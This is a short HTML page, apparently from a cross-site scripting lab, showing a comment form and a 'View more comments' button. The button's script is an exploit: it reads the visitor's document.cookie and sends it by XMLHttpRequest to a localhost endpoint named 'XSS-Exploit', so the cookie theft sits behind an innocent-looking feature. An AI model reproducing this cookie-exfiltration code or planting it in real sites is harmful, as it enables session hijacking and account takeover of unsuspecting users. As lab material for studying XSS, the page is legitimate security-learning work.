<html>
<body>
<h2>Welcome to Search website</h2>

 <form  method="GET" action="addcomment">
           Your name:    <input type="text" name="username"/>
            Your comment  : <input type="text" name="comment"/>
                <button type="submit">ADD</button>
   </form>
            <button onclick="go()">View more comments</button>
            </body>
<script>
            function go(){
                const http=new XMLHttpRequest();
                const val=document.cookie;
            http.open('GET',"http://localhost:8081/XSS-Exploit/welcome?search="+val);
                http.send();
                console.log(http.responseText);
            }
            </script>
</html>
